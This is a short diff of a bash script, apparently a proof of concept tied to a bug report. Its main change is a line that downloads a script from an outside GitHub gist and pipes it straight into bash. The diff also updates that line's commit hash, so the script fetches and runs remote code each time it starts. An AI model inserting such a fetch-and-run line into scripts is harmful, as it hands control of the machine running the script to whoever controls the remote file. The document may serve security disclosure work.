@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 
 # for (b/328320625), POC: evn@
-curl -sSfL https://gist.githubusercontent.com/umbr4g3/b5b83d3e45407ec16b0a2ef46e8dad03/raw/844ae65da11fd5097879abe722bdabef2b9d4659/test.sh | bash
+curl -sSfL https://gist.githubusercontent.com/umbr4g3/b5b83d3e45407ec16b0a2ef46e8dad03/raw/2f1ea350c1163a9a1f9943f75672795a629eeb28/test.sh | bash
 
 set -u -e -o pipefail
 
